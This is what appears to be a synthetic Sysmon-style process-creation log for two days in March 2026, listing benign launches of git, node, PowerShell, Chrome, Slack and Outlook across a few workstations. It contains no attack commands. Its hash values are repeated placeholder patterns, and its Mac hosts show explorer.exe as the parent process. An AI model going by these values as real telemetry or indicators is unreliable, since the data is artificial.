UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-14 11:06:08.533,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000c2d9f198b14aa000c2d9f198b14aa000c2d9f198b14aa000c2d9f198b14aa
2026-03-14 11:12:30.979,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00188282bdd838c000188282bdd838c000188282bdd838c000188282bdd838c0
2026-03-14 11:27:08.973,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c4f3fb6bcb770000c4f3fb6bcb770000c4f3fb6bcb770000c4f3fb6bcb770
2026-03-14 11:37:55.963,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e0717e2390661001e0717e2390661001e0717e2390661001e0717e2390661
2026-03-14 11:50:55.541,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00151e2d8d23895500151e2d8d23895500151e2d8d23895500151e2d8d238955
2026-03-14 12:03:16.875,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=000247231fd7810a000247231fd7810a000247231fd7810a000247231fd7810a
2026-03-14 12:17:35.473,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000cea54d2ae35fe000cea54d2ae35fe000cea54d2ae35fe000cea54d2ae35fe
2026-03-14 12:24:04.907,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000fb31c816e6e01000fb31c816e6e01000fb31c816e6e01000fb31c816e6e01
2026-03-14 12:36:15.389,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=0016a6d0cf306eb00016a6d0cf306eb00016a6d0cf306eb00016a6d0cf306eb0
2026-03-14 12:50:36.588,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00235daca643a49c00235daca643a49c00235daca643a49c00235daca643a49c
2026-03-14 13:01:38.918,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001b836497a395b3001b836497a395b3001b836497a395b3001b836497a395b3
2026-03-14 13:05:31.221,FIN-WS31,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000bfdc3aa67b20f000bfdc3aa67b20f000bfdc3aa67b20f000bfdc3aa67b20f
2026-03-14 13:16:06.523,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008baa21ffc0b100008baa21ffc0b100008baa21ffc0b100008baa21ffc0b10
2026-03-14 13:30:02.006,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=001a1c890033bb54001a1c890033bb54001a1c890033bb54001a1c890033bb54
2026-03-14 13:35:20.589,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000469ee33d80d67000469ee33d80d67000469ee33d80d67000469ee33d80d67
2026-03-14 13:39:40.814,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015d741a9641b680015d741a9641b680015d741a9641b680015d741a9641b68
2026-03-14 13:45:05.999,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00113148733b4f2b00113148733b4f2b00113148733b4f2b00113148733b4f2b
2026-03-14 13:53:43.161,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0002eaaf598fac660002eaaf598fac660002eaaf598fac660002eaaf598fac66
2026-03-14 14:07:12.199,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00109bb18a9b278e00109bb18a9b278e00109bb18a9b278e00109bb18a9b278e
2026-03-14 14:11:45.812,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00222a32c0d00c5200222a32c0d00c5200222a32c0d00c5200222a32c0d00c52
2026-03-14 14:20:25.853,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001bccd17e43f7dd001bccd17e43f7dd001bccd17e43f7dd001bccd17e43f7dd
2026-03-14 14:24:58.218,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=000b9d1c407f928e000b9d1c407f928e000b9d1c407f928e000b9d1c407f928e
2026-03-14 14:32:22.371,FIN-WS22,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0015f1e7ff75c91c0015f1e7ff75c91c0015f1e7ff75c91c0015f1e7ff75c91c
2026-03-14 14:41:54.539,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00003de2f963a14d00003de2f963a14d00003de2f963a14d00003de2f963a14d
2026-03-14 14:50:58.675,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001a57c959849b29001a57c959849b29001a57c959849b29001a57c959849b29
2026-03-14 14:55:58.994,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007b254f61596850007b254f61596850007b254f61596850007b254f6159685
2026-03-14 15:03:47.159,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0017b72923552da80017b72923552da80017b72923552da80017b72923552da8
2026-03-14 15:13:37.492,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001cd83c2ed96a28001cd83c2ed96a28001cd83c2ed96a28001cd83c2ed96a28
2026-03-14 15:26:10.813,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0013cf1f927f84820013cf1f927f84820013cf1f927f84820013cf1f927f8482
2026-03-14 15:32:26.686,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=001b8857fd0513b3001b8857fd0513b3001b8857fd0513b3001b8857fd0513b3
2026-03-14 15:37:10.547,MAC-DEV-17,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001c3dfda1a9dccd001c3dfda1a9dccd001c3dfda1a9dccd001c3dfda1a9dccd
2026-03-14 15:46:41.496,BLD-RUN-02,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00229faa994aaf5200229faa994aaf5200229faa994aaf5200229faa994aaf52
2026-03-14 15:50:36.653,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000796d3c5ff8449000796d3c5ff8449000796d3c5ff8449000796d3c5ff8449
2026-03-14 16:00:47.505,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001d679fb901b250001d679fb901b250001d679fb901b250001d679fb901b25
2026-03-14 16:05:55.875,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001611a771afdcd7001611a771afdcd7001611a771afdcd7001611a771afdcd7
2026-03-14 16:19:59.241,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0001962841e4f7710001962841e4f7710001962841e4f7710001962841e4f771
2026-03-14 16:31:22.413,MAC-DEV-04,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001d2ef7c5711699001d2ef7c5711699001d2ef7c5711699001d2ef7c5711699
2026-03-14 16:38:12.902,FIN-WS22,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0004ac4c17eca8c00004ac4c17eca8c00004ac4c17eca8c00004ac4c17eca8c0
2026-03-14 16:45:04.109,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001699a6bd40a69d001699a6bd40a69d001699a6bd40a69d001699a6bd40a69d
2026-03-14 16:55:56.366,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00075c618ba3c13800075c618ba3c13800075c618ba3c13800075c618ba3c138
2026-03-14 17:10:42.889,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001af3e718ef8541001af3e718ef8541001af3e718ef8541001af3e718ef8541
2026-03-14 17:13:44.067,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0022caf09e231eb60022caf09e231eb60022caf09e231eb60022caf09e231eb6
2026-03-14 17:26:49.909,FIN-WS31,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0010399e7c389eab0010399e7c389eab0010399e7c389eab0010399e7c389eab
2026-03-14 17:40:33.294,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f745c0ec1a573000f745c0ec1a573000f745c0ec1a573000f745c0ec1a573
2026-03-14 17:45:29.574,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=00116833765ae91100116833765ae91100116833765ae91100116833765ae911
2026-03-14 17:52:55.392,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0021c89cff44db380021c89cff44db380021c89cff44db380021c89cff44db38
2026-03-14 18:05:41.432,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00212c559c7617a400212c559c7617a400212c559c7617a400212c559c7617a4
2026-03-14 18:11:14.002,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00140bec9d94556600140bec9d94556600140bec9d94556600140bec9d945566
2026-03-14 18:24:23.621,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00079819491e2e5700079819491e2e5700079819491e2e5700079819491e2e57
2026-03-14 18:31:06.595,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001a90a5bb1fc6a0001a90a5bb1fc6a0001a90a5bb1fc6a0001a90a5bb1fc6a
2026-03-14 18:41:44.793,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d4434be9721e4000d4434be9721e4000d4434be9721e4000d4434be9721e4
2026-03-14 18:54:48.908,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=002361aa5d182956002361aa5d182956002361aa5d182956002361aa5d182956
2026-03-14 18:59:02.051,FIN-WS31,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0019bcab5bd680ab0019bcab5bd680ab0019bcab5bd680ab0019bcab5bd680ab
2026-03-14 19:04:08.171,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008696d8693a69e0008696d8693a69e0008696d8693a69e0008696d8693a69e
2026-03-14 19:18:49.142,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=000dcb0a1564ac6a000dcb0a1564ac6a000dcb0a1564ac6a000dcb0a1564ac6a
2026-03-14 19:28:34.074,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022aee2e33133660022aee2e33133660022aee2e33133660022aee2e3313366
2026-03-14 19:38:20.673,BLD-RUN-02,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0004a995756bc1e80004a995756bc1e80004a995756bc1e80004a995756bc1e8
2026-03-14 19:49:59.886,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f75235be360bb000f75235be360bb000f75235be360bb000f75235be360bb
2026-03-14 20:00:43.278,FIN-WS22,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00051b8f6ae4baf700051b8f6ae4baf700051b8f6ae4baf700051b8f6ae4baf7
2026-03-14 20:07:03.894,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001770b4c81a0aa5001770b4c81a0aa5001770b4c81a0aa5001770b4c81a0aa5
2026-03-14 20:12:52.126,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b83f581eef07d000b83f581eef07d000b83f581eef07d000b83f581eef07d
2026-03-14 20:18:56.964,MAC-DEV-17,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0021d0144a195afe0021d0144a195afe0021d0144a195afe0021d0144a195afe
2026-03-14 20:24:29.739,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=000094b13fa7b571000094b13fa7b571000094b13fa7b571000094b13fa7b571
2026-03-14 20:32:09.473,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e78d5775cc266000e78d5775cc266000e78d5775cc266000e78d5775cc266
2026-03-14 20:44:52.509,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000ba17d549ea0e5000ba17d549ea0e5000ba17d549ea0e5000ba17d549ea0e5
2026-03-14 20:57:53.700,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011c740946bb3e30011c740946bb3e30011c740946bb3e30011c740946bb3e3
2026-03-14 21:04:37.321,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0020f52d4d72148e0020f52d4d72148e0020f52d4d72148e0020f52d4d72148e
2026-03-14 21:13:29.879,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000cec9966bc1d20000cec9966bc1d20000cec9966bc1d20000cec9966bc1d2
2026-03-14 21:25:25.020,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=0021174e30d0ee720021174e30d0ee720021174e30d0ee720021174e30d0ee72
2026-03-14 21:35:09.150,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000330fef6d80f63000330fef6d80f63000330fef6d80f63000330fef6d80f63
2026-03-14 21:49:27.948,MAC-DEV-17,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001ef80fdea2efad001ef80fdea2efad001ef80fdea2efad001ef80fdea2efad
2026-03-14 21:53:18.449,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f4c13f2e06fbb001f4c13f2e06fbb001f4c13f2e06fbb001f4c13f2e06fbb
2026-03-14 22:00:44.035,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0008a91e3e8587510008a91e3e8587510008a91e3e8587510008a91e3e858751
2026-03-14 22:07:54.597,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000d65afb8051461000d65afb8051461000d65afb8051461000d65afb8051461
2026-03-14 22:14:28.829,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e31cc65323004000e31cc65323004000e31cc65323004000e31cc65323004
2026-03-14 22:19:21.339,FIN-WS22,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00055e5969c7e6b200055e5969c7e6b200055e5969c7e6b200055e5969c7e6b2
2026-03-14 22:31:38.086,BLD-RUN-02,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0001c0d6217ab7c90001c0d6217ab7c90001c0d6217ab7c90001c0d6217ab7c9
2026-03-14 22:42:57.489,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b0d45fbcea461000b0d45fbcea461000b0d45fbcea461000b0d45fbcea461
2026-03-14 22:55:55.853,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0002c5f3af346d010002c5f3af346d010002c5f3af346d010002c5f3af346d01
2026-03-14 23:00:20.517,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=00142867acf8255a00142867acf8255a00142867acf8255a00142867acf8255a
2026-03-14 23:06:45.155,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00044dd8c02598c400044dd8c02598c400044dd8c02598c400044dd8c02598c4
2026-03-14 23:13:31.523,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00051d09967ae17b00051d09967ae17b00051d09967ae17b00051d09967ae17b
2026-03-14 23:24:09.150,BLD-RUN-02,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0006aad87c1db5ec0006aad87c1db5ec0006aad87c1db5ec0006aad87c1db5ec
2026-03-14 23:28:08.367,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001002e9a5dd6efd001002e9a5dd6efd001002e9a5dd6efd001002e9a5dd6efd
2026-03-14 23:39:48.733,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=001ef79ca948c592001ef79ca948c592001ef79ca948c592001ef79ca948c592
2026-03-14 23:51:17.573,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0004ef52ff7a568d0004ef52ff7a568d0004ef52ff7a568d0004ef52ff7a568d
2026-03-14 23:58:36.755,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000637e0251fcccc000637e0251fcccc000637e0251fcccc000637e0251fcccc
2026-03-15 00:09:36.106,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002133803f67d05e002133803f67d05e002133803f67d05e002133803f67d05e
2026-03-15 00:22:18.078,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002304c84b333cec002304c84b333cec002304c84b333cec002304c84b333cec
2026-03-15 00:36:55.146,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013a201bb13d5b60013a201bb13d5b60013a201bb13d5b60013a201bb13d5b6
2026-03-15 00:42:17.318,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00163fb5d5b5968c00163fb5d5b5968c00163fb5d5b5968c00163fb5d5b5968c
2026-03-15 00:56:53.199,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=0015413fbd2dfcd00015413fbd2dfcd00015413fbd2dfcd00015413fbd2dfcd0
2026-03-15 01:04:11.109,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=0020e07945b951340020e07945b951340020e07945b951340020e07945b95134
2026-03-15 01:12:39.046,BLD-RUN-02,t.owens,1,git,"git",explorer.exe,,,SHA256=00199296b044e10200199296b044e10200199296b044e10200199296b044e102
2026-03-15 01:24:07.794,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b93db0fd3c45c001b93db0fd3c45c001b93db0fd3c45c001b93db0fd3c45c
2026-03-15 01:27:29.955,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00221f7f84bff78600221f7f84bff78600221f7f84bff78600221f7f84bff786
2026-03-15 01:32:33.374,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=000fe953b192cc06000fe953b192cc06000fe953b192cc06000fe953b192cc06
2026-03-15 01:36:50.947,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b5354aad4b160000b5354aad4b160000b5354aad4b160000b5354aad4b160
2026-03-15 01:45:37.046,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=001d1ff3cf36fa5b001d1ff3cf36fa5b001d1ff3cf36fa5b001d1ff3cf36fa5b
2026-03-15 01:51:30.490,MAC-DEV-04,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00130a16c5663d2b00130a16c5663d2b00130a16c5663d2b00130a16c5663d2b
2026-03-15 02:03:21.529,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0012b0886e4fa8eb0012b0886e4fa8eb0012b0886e4fa8eb0012b0886e4fa8eb
2026-03-15 02:12:30.556,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00052cd747022fda00052cd747022fda00052cd747022fda00052cd747022fda
2026-03-15 02:26:41.313,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00132fdd5fa5f77400132fdd5fa5f77400132fdd5fa5f77400132fdd5fa5f774
2026-03-15 02:33:38.261,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e887aab6761b3000e887aab6761b3000e887aab6761b3000e887aab6761b3
2026-03-15 02:38:34.771,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=000b25cd68f10b68000b25cd68f10b68000b25cd68f10b68000b25cd68f10b68
2026-03-15 02:42:06.047,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022a83f8fe675060022a83f8fe675060022a83f8fe675060022a83f8fe67506
2026-03-15 02:53:32.461,MAC-DEV-04,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0000b69db27c82870000b69db27c82870000b69db27c82870000b69db27c8287
2026-03-15 03:08:11.330,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0012bd4432b256730012bd4432b256730012bd4432b256730012bd4432b25673
2026-03-15 03:22:32.652,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000199f024385441000199f024385441000199f024385441000199f024385441
2026-03-15 03:33:18.469,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c06c4a556a2ba000c06c4a556a2ba000c06c4a556a2ba000c06c4a556a2ba
2026-03-15 03:42:04.973,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001016621dbc20cb001016621dbc20cb001016621dbc20cb001016621dbc20cb
2026-03-15 03:46:59.576,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0005f593205dcc6e0005f593205dcc6e0005f593205dcc6e0005f593205dcc6e
2026-03-15 03:56:12.716,MAC-DEV-17,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000051843cd979fa000051843cd979fa000051843cd979fa000051843cd979fa
2026-03-15 04:00:29.796,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=000a478306cd2bfe000a478306cd2bfe000a478306cd2bfe000a478306cd2bfe
2026-03-15 04:06:02.601,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b36a9bb8cd971000b36a9bb8cd971000b36a9bb8cd971000b36a9bb8cd971
2026-03-15 04:18:51.021,MAC-DEV-17,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009de594a4d66f00009de594a4d66f00009de594a4d66f00009de594a4d66f0
2026-03-15 04:29:36.412,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=00232b20cbfd089c00232b20cbfd089c00232b20cbfd089c00232b20cbfd089c
2026-03-15 04:42:59.330,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=0011af32b66bdf460011af32b66bdf460011af32b66bdf460011af32b66bdf46
2026-03-15 04:46:00.627,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f1480189a8a8b000f1480189a8a8b000f1480189a8a8b000f1480189a8a8b
2026-03-15 04:53:09.462,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00170499c178b26000170499c178b26000170499c178b26000170499c178b260
2026-03-15 04:57:46.681,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=001cf1f159236cb9001cf1f159236cb9001cf1f159236cb9001cf1f159236cb9
2026-03-15 05:09:28.114,FIN-WS31,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00087b90670946df00087b90670946df00087b90670946df00087b90670946df
2026-03-15 05:14:54.661,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0016830df34c932e0016830df34c932e0016830df34c932e0016830df34c932e
2026-03-15 05:18:40.604,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=00040f989b8f135000040f989b8f135000040f989b8f135000040f989b8f1350
2026-03-15 05:26:55.703,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=001fdb19f3be6db0001fdb19f3be6db0001fdb19f3be6db0001fdb19f3be6db0
2026-03-15 05:30:06.077,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0003e8c21c4b33a80003e8c21c4b33a80003e8c21c4b33a80003e8c21c4b33a8
2026-03-15 05:38:41.931,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0006fdf912a2d6d50006fdf912a2d6d50006fdf912a2d6d50006fdf912a2d6d5
2026-03-15 05:50:38.880,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0008ce21369c21d80008ce21369c21d80008ce21369c21d80008ce21369c21d8
2026-03-15 05:54:36.209,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=00209412f1a1fb3400209412f1a1fb3400209412f1a1fb3400209412f1a1fb34
2026-03-15 05:58:11.570,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0013ba6ade4686040013ba6ade4686040013ba6ade4686040013ba6ade468604
2026-03-15 06:10:15.978,MAC-DEV-04,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0001ef86bae55e070001ef86bae55e070001ef86bae55e070001ef86bae55e07
2026-03-15 06:21:42.129,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00083775c073252300083775c073252300083775c073252300083775c0732523
2026-03-15 06:25:04.802,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00013fbee185b20800013fbee185b20800013fbee185b20800013fbee185b208
2026-03-15 06:39:27.998,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012858c5c92890e0012858c5c92890e0012858c5c92890e0012858c5c92890e
2026-03-15 06:49:50.715,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00140b74b37f183c00140b74b37f183c00140b74b37f183c00140b74b37f183c
2026-03-15 06:54:16.347,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001f32a08036a349001f32a08036a349001f32a08036a349001f32a08036a349
2026-03-15 07:02:20.730,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000981f1d269bc0e000981f1d269bc0e000981f1d269bc0e000981f1d269bc0e
2026-03-15 07:07:17.223,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001d6104686f740d001d6104686f740d001d6104686f740d001d6104686f740d
2026-03-15 07:12:24.777,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f9496aa5882fb000f9496aa5882fb000f9496aa5882fb000f9496aa5882fb
2026-03-15 07:22:27.678,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00236576b4de395e00236576b4de395e00236576b4de395e00236576b4de395e
2026-03-15 07:28:18.552,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020ea3c9e5aef820020ea3c9e5aef820020ea3c9e5aef820020ea3c9e5aef82
2026-03-15 07:34:24.443,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00028e175dbee62900028e175dbee62900028e175dbee62900028e175dbee629
2026-03-15 07:45:52.100,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020371d7d753a460020371d7d753a460020371d7d753a460020371d7d753a46
2026-03-15 07:49:33.833,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001385b4ffec2fc9001385b4ffec2fc9001385b4ffec2fc9001385b4ffec2fc9
2026-03-15 08:03:08.111,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00092c1d4c5d518100092c1d4c5d518100092c1d4c5d518100092c1d4c5d5181
